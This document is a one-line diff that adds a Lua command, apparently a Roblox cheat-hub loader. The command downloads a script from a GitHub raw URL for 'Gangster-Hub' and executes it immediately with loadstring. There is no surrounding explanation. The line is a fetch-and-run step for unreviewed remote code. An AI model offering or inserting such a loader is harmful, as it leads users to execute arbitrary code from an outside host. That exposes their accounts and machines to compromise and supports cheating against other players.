@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Spedas-Maker/Gangster-Hub/main/Script"))()
